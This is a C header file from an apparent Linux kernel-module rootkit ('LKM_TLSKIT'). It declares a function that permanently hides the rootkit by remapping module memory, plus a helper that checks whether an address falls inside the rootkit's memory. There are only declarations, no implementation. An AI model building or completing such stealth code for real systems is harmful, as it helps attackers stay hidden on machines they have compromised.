#ifndef LKM_TLSKIT_MODULE_HIDING_H
#define LKM_TLSKIT_MODULE_HIDING_H

/**
 * Hide the rootkit forever by remapping the kernel module's memory location
 * such that the rootkit is no longer connected to the kernel module
 * @return 0 on success, -1 else
 */
int hide_module(void);

/**
 * Check if addr is within the rootkit's  memory location
 * @param addr
 * @return 1 if so, 0 else
 */
int __within_module_core(unsigned long addr);

#endif //LKM_TLSKIT_MODULE_HIDING_H
